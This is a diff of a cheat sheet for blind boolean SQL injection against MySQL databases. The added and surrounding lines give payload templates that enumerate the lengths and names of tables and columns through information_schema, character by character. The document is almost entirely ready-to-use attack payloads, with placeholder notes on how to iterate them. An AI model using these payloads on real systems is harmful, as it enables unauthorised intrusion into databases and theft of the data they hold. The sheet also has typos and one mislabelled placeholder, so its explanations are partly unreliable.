@@ -1,6 +1,7 @@
 - Dumping the LENGHT of a table name:
 ' UNION SELECT 1 WHERE (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {index},1) = {LENGHT}-- -
 
+
 - Dumping the TABLE NAME character by character:
 ' UNION SELECT 1 WHERE ascii(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {index},1), {position}, 1)) = {ascii_value}-- -
 
@@ -8,6 +9,12 @@
 {position} — Extracts a specific character of the table name.
 {ascii_value} — The ASCII value of the target character.
 
+
+- Dumping COLUMN LENGHTS:
+' UNION SELECT 1 WHERE (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='{table_name}' LIMIT {position},1) = {NUMBER}-- -
+{table_name}: The table name you are targeting.
+{position} — Extracts a specific character of the table name.
+{number} - lenght of the column name, just keep iterating until the statement is True.
 
 - Dumping COLUMN NAMES character by character:
 ' UNION SELECT 1 WHERE ascii(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='{table_name}' LIMIT {index},1), {position}, 1)) = {ascii_value}-- -
